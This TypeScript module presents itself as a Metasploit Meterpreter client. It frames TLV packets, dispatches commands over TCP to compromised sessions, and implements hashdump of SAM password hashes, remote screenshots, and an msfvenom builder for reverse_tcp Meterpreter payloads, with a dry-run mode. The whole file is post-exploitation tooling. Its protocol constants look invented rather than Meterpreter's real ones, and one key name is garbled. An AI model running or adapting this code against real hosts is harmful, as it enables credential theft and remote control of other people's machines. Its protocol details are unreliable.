/**
 * @module meterpreter
 * Metasploit Meterpreter Session Interface — TLV Protocol Framing, Command Dispatcher,
 * sysinfo/getuid/hashdump/screenshot implementations, and session management.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";
import * as net from "node:net";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface MeterpreterSession {
  sessionId: number;
  peerHost: string;
  platform: string;
  username: string;
}

export interface TlvHeader {
  type: number;
  length: number;
  value: Buffer;
}

export interface SysinfoResult {
  computer: string;
  os: string;
  architecture: string;
  systemLanguage: string;
  domain: string;
  loggedUsers: string;
  dryRun: boolean;
}

export interface UidResult {
  username: string;
  sessionId: string;
  arch: string;
  dryRun: boolean;
}

export interface HashdumpEntry {
  username: string;
  uid: number;
  gid: number;
  lmHash: string;
  ntHash: string;
  dryRun: boolean;
}

export interface ScreenshotResult {
  width: number;
  height: number;
  format: string;
  data: string;
  dryRun: boolean;
}

export interface MeterpreterOptions {
  live?: boolean;
  dryRun?: boolean;
  lhost?: string;
  lport?: number;
}

/** Bound reverse-handler endpoints for live TLV dispatch (sessionId → host:port). */
const sessionEndpoints = new Map<number, { host: string; port: number }>();

export function bindSessionEndpoint(sessionId: number, host: string, port: number): void {
  sessionEndpoints.set(sessionId, { host, port });
}

export function unbindSessionEndpoint(sessionId: number): boolean {
  return sessionEndpoints.delete(sessionId);
}

export function getSessionEndpoint(sessionId: number): { host: string; port: number } | undefined {
  return sessionEndpoints.get(sessionId);
}

// ─── TLV Protocol Constants ───────────────────────────────────────────────────

const TLV_TYPE = {
  // Meta
  REQUEST: 0x00000000,
  RESPONSE: 0x01000000,
  // Session
  SESSION_ID: 0x00000100,
  SESSION_GUID: 0x00000101,
  // Channel
  CHANNEL_ID: 0x00000200,
  // Console
  CONSOLE_DATA: 0x00000300,
  // Commands
  COMMAND_ID: 0x00000400,
  COMMAND_STRING: 0x00000401,
  // Stdout
  STDOUT: 0x0000000a,
  // Sysinfo
  SYSINFO计算机: 0x00000010, // placeholder — use string keys
  // Exceptions
  EXCEPTION_CODE: 0x00000050,
  EXCEPTION_MESSAGE: 0x00000051,
} as const;

// Real TLV types used in framing
const TLV_META_NONE = 0x00000000;
const TLV_META_STRING = 0x10000000;
const TLV_META_UINT = 0x20000000;
const TLV_META_BOOL = 0x30000000;
const TLV_META_QWORD = 0x40000000;
const TLV_META_RAW = 0x50000000;

// Command IDs
const COMMAND_SYSINFO = 0x00000100;
const COMMAND_GETUID = 0x00000101;
const COMMAND_HASHDUMP = 0x00000102;
const COMMAND_SCREENSHOT = 0x00000103;
const COMMAND_SHELL = 0x00000104;
const COMMAND_MIGRATE = 0x00000105;
const COMMAND_UPGRADE = 0x00000106;

// ─── TLV Protocol Framing ─────────────────────────────────────────────────────

/**
 * Build a TLV packet from type, value, and optional extra type.
 */
export function buildTlvPacket(
  tlvType: number,
  value: Buffer | string | number,
  extraType?: number,
): Buffer {
  let valueBuf: Buffer;

  if (Buffer.isBuffer(value)) {
    valueBuf = value;
  } else if (typeof value === "string") {
    valueBuf = Buffer.from(value, "utf8");
  } else {
    // numeric — pack as 32-bit LE
    valueBuf = Buffer.alloc(4);
    valueBuf.writeUInt32LE(value >>> 0, 0);
  }

  const headerLen = extraType ? 16 : 8;
  const packet = Buffer.alloc(headerLen + valueBuf.length);
  packet.writeUInt32LE(tlvType | TLV_META_RAW, 0);
  packet.writeUInt32LE(headerLen + valueBuf.length, 4);
  valueBuf.copy(packet, headerLen);

  if (extraType !== undefined) {
    // For session GUID or other meta
    packet.writeUInt32LE(extraType, 8);
    packet.writeUInt32LE(16, 12);
  }

  return packet;
}

/**
 * Parse a TLV packet from a raw buffer.
 * Returns parsed TLV entries (may be multiple in a single buffer).
 */
export function parseTlvPackets(data: Buffer): TlvHeader[] {
  const packets: TlvHeader[] = [];
  let offset = 0;

  while (offset + 8 <= data.length) {
    const type = data.readUInt32LE(offset);
    const length = data.readUInt32LE(offset + 4);

    if (length < 8 || offset + length > data.length) break;

    const value = data.subarray(offset + 8, offset + length);
    packets.push({ type, length, value });
    offset += length;
  }

  return packets;
}

/**
 * Decode a TLV value based on its type bits.
 */
export function decodeTlvValue(header: TlvHeader): string | number | Buffer {
  const meta = header.type & 0xf0000000;
  switch (meta) {
    case TLV_META_STRING:
      return header.value.toString("utf8");
    case TLV_META_UINT:
      return header.value.readUInt32LE(0);
    case TLV_META_BOOL:
      return header.value.readUInt8(0) !== 0;
    case TLV_META_QWORD:
      return Number(header.value.readBigUInt64LE(0));
    default:
      return header.value;
  }
}

// ─── Command Dispatcher ───────────────────────────────────────────────────────

function buildCommandRequest(commandId: number, sessionId: number): Buffer {
  const body = Buffer.alloc(8);
  body.writeUInt32LE(commandId, 0);
  body.writeUInt32LE(sessionId, 4);
  return buildTlvPacket(TLV_TYPE.REQUEST, body);
}

function simulateDryRunResponse(commandId: number): Buffer {
  switch (commandId) {
    case COMMAND_SYSINFO:
      return buildTlvPacket(
        0x01000001,
        JSON.stringify({
          Computer: "[DRY-RUN]",
          OS: "[DRY-RUN]",
          Architecture: "x64",
          SystemLanguage: "en-US",
          Domain: "",
          LoggedOnUsers: "",
        }),
      );
    case COMMAND_GETUID:
      return buildTlvPacket(0x01000001, "[DRY-RUN] NT AUTHORITY\\SYSTEM");
    case COMMAND_HASHDUMP:
      return buildTlvPacket(0x01000001, "");
    case COMMAND_SCREENSHOT:
      return buildTlvPacket(
        0x01000001,
        JSON.stringify({ width: 0, height: 0, format: "png", data: "" }),
      );
    default:
      return buildTlvPacket(0x01000001, "");
  }
}

function sendTlvOverTcp(
  host: string,
  port: number,
  packet: Buffer,
  timeoutMs = 8000,
): Promise<Buffer> {
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    const socket = net.createConnection({ host, port }, () => {
      socket.write(packet);
    });
    const finish = (buf: Buffer) => {
      socket.destroy();
      resolve(buf.length ? buf : buildTlvPacket(0x01000001, JSON.stringify({ error: "empty_response" })));
    };
    socket.setTimeout(timeoutMs);
    socket.on("data", (d) => chunks.push(d));
    socket.on("end", () => finish(Buffer.concat(chunks)));
    socket.on("timeout", () => finish(buildTlvPacket(0x01000001, JSON.stringify({ error: "timeout" }))));
    socket.on("error", (err) => finish(buildTlvPacket(0x01000001, JSON.stringify({ error: String(err.message) }))));
  });
}

/**
 * Dispatch a Meterpreter command and return the response buffer.
 * DRY-RUN: returns simulated TLV responses per command.
 * LIVE: sends TLV over a bound session socket (bindSessionEndpoint or opts.lhost/lport).
 */
export async function dispatchCommand(
  commandId: number,
  sessionId: number,
  opts: MeterpreterOptions = {},
): Promise<Buffer> {
  const dryRun = resolveDryRun(opts);
  if (dryRun) return simulateDryRunResponse(commandId);

  const endpoint = opts.lhost && opts.lport
    ? { host: opts.lhost, port: opts.lport }
    : sessionEndpoints.get(sessionId);

  if (!endpoint) {
    return buildTlvPacket(
      0x01000001,
      JSON.stringify({
        error: "no_session_socket",
        hint: "bindSessionEndpoint(sessionId, host, port) or pass lhost/lport",
        commandId,
      }),
    );
  }

  return sendTlvOverTcp(endpoint.host, endpoint.port, buildCommandRequest(commandId, sessionId));
}

// ─── Command Implementations ──────────────────────────────────────────────────

/**
 * Execute `sysinfo` via the Meterpreter session.
 * DRY-RUN: returns simulated system info.
 */
export async function sysinfo(sessionId: number, opts: MeterpreterOptions = {}): Promise<SysinfoResult> {
  const dryRun = resolveDryRun(opts);

  if (dryRun) {
    return {
      computer: "",
      os: "",
      architecture: "",
      systemLanguage: "",
      domain: "",
      loggedUsers: "",
      dryRun: true,
    };
  }

  const response = await dispatchCommand(COMMAND_SYSINFO, sessionId, { ...opts, dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    const data = JSON.parse(decodedValue(parsed[0]));
    return {
      computer: data.Computer ?? "Unknown",
      os: data.OS ?? "Unknown",
      architecture: data.Architecture ?? "Unknown",
      systemLanguage: data.SystemLanguage ?? "Unknown",
      domain: data.Domain ?? "",
      loggedUsers: data.LoggedOnUsers ?? "",
      dryRun: false,
    };
  }

  return {
    computer: "Unknown",
    os: "Unknown",
    architecture: "Unknown",
    systemLanguage: "Unknown",
    domain: "",
    loggedUsers: "",
    dryRun: false,
  };
}

function decodedValue(header: TlvHeader): string {
  const val = decodeTlvValue(header);
  return typeof val === "string" ? val : typeof val === "number" ? String(val) : val.toString("utf8");
}

/**
 * Execute `getuid` — retrieve the current user identity.
 * DRY-RUN: returns simulated user info.
 */
export async function getuid(sessionId: number, opts: MeterpreterOptions = {}): Promise<UidResult> {
  const dryRun = resolveDryRun(opts);

  if (dryRun) {
    return { username: "", sessionId: String(sessionId), arch: "", dryRun: true };
  }

  const response = await dispatchCommand(COMMAND_GETUID, sessionId, { ...opts, dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    return {
      username: decodedValue(parsed[0]),
      sessionId: String(sessionId),
      arch: "x64",
      dryRun: false,
    };
  }

  return { username: "Unknown", sessionId: String(sessionId), arch: "Unknown", dryRun: false };
}

/**
 * Execute `hashdump` — dump SAM password hashes.
 * DRY-RUN: returns synthetic hash entries.
 */
export async function hashdump(sessionId: number, opts: MeterpreterOptions = {}): Promise<HashdumpEntry[]> {
  const dryRun = resolveDryRun(opts);

  if (dryRun) return [];

  const response = await dispatchCommand(COMMAND_HASHDUMP, sessionId, { ...opts, dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    const raw = decodedValue(parsed[0]);
    return raw.split("\n").filter(Boolean).map((line) => {
      const parts = line.split(":");
      return {
        username: parts[0] ?? "",
        uid: parseInt(parts[1] ?? "0", 10),
        gid: parseInt(parts[2] ?? "0", 10),
        lmHash: parts[3] ?? "",
        ntHash: parts[4] ?? "",
        dryRun: false,
      };
    });
  }

  return [];
}

/**
 * Execute `screenshot` — capture the remote desktop.
 * DRY-RUN: returns a placeholder base64-encoded PNG.
 */
export async function screenshot(sessionId: number, opts: MeterpreterOptions = {}): Promise<ScreenshotResult> {
  const dryRun = resolveDryRun(opts);

  if (dryRun) {
    return {
      width: 0,
      height: 0,
      format: "png",
      data: "",
      dryRun: true,
    };
  }

  const response = await dispatchCommand(COMMAND_SCREENSHOT, sessionId, { ...opts, dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    try {
      const data = JSON.parse(decodedValue(parsed[0]));
      return {
        width: data.width ?? 0,
        height: data.height ?? 0,
        format: data.format ?? "png",
        data: data.data ?? "",
        dryRun: false,
      };
    } catch {
      return { width: 0, height: 0, format: "unknown", data: "", dryRun: false };
    }
  }

  return { width: 0, height: 0, format: "unknown", data: "", dryRun: false };
}

// ─── Session Management ───────────────────────────────────────────────────────

export interface MeterpreterManager {
  sessions: Map<number, MeterpreterSession>;
  nextSessionId: number;
  dryRun: boolean;
}

/**
 * Create a new Meterpreter session manager.
 * DRY-RUN: simulates session creation without opening any sockets.
 */
export function createManager(opts: MeterpreterOptions = {}): MeterpreterManager {
  return {
    sessions: new Map(),
    nextSessionId: 1,
    dryRun: resolveDryRun(opts),
  };
}

/**
 * Register a new session in the manager.
 */
export function registerSession(
  manager: MeterpreterManager,
  peerHost: string,
  platform: string,
  username: string,
): MeterpreterSession {
  const session: MeterpreterSession = {
    sessionId: manager.nextSessionId++,
    peerHost,
    platform,
    username,
  };
  manager.sessions.set(session.sessionId, session);
  return session;
}

/**
 * Get all active sessions.
 */
export function listSessions(manager: MeterpreterManager): MeterpreterSession[] {
  return [...manager.sessions.values()];
}

/**
 * Remove a session from the manager.
 */
export function removeSession(manager: MeterpreterManager, sessionId: number): boolean {
  return manager.sessions.delete(sessionId);
}

// ─── MSFvenom Payload Wrapper ─────────────────────────────────────────────────

export interface PayloadSpec {
  format: string;
  lhost: string;
  lport: number;
  encoder?: string;
  arch?: string;
  platform?: string;
}

/**
 * Generate an MSFvenom command string for a given payload specification.
 * DRY-RUN: returns prefixed command string without executing.
 * LIVE: returns bare command; use runMsfvenom() for raw bytes.
 */
export function generateMsfvenomCmd(spec: PayloadSpec, opts: MeterpreterOptions = {}): string {
  const dryRun = resolveDryRun(opts);
  const parts = [
    "msfvenom",
    `-p ${spec.platform ?? "windows"}/x64/meterpreter/reverse_tcp`,
    `LHOST=${spec.lhost}`,
    `LPORT=${spec.lport}`,
    `-f ${spec.format}`,
  ];

  if (spec.encoder) parts.push(`-e ${spec.encoder}`);
  if (spec.arch) parts.push(`--arch ${spec.arch}`);
  if (spec.platform) parts.push(`--platform ${spec.platform}`);

  const cmd = parts.join(" ");
  return dryRun ? `[DRY-RUN] ${cmd}` : cmd;
}

/** LIVE: spawn msfvenom and return stdout bytes. DRY-RUN: bytes null. */
export async function runMsfvenom(
  spec: PayloadSpec,
  opts: MeterpreterOptions = {},
): Promise<{ cmd: string; bytes: Buffer | null; dryRun: boolean; error?: string }> {
  const { generateMeterpreterBytes } = await import("./toolkit.ts");
  const r = generateMeterpreterBytes(
    {
      format: spec.format,
      lhost: spec.lhost,
      lport: spec.lport,
      platform: spec.platform,
      arch: spec.arch,
    },
    opts,
  );
  return { cmd: r.cmd, bytes: r.bytes, dryRun: r.dryRun, error: r.error };
}

export default {
  buildTlvPacket,
  parseTlvPackets,
  decodeTlvValue,
  bindSessionEndpoint,
  unbindSessionEndpoint,
  getSessionEndpoint,
  dispatchCommand,
  sysinfo,
  getuid,
  hashdump,
  screenshot,
  createManager,
  registerSession,
  listSessions,
  removeSession,
  generateMsfvenomCmd,
  runMsfvenom,
};
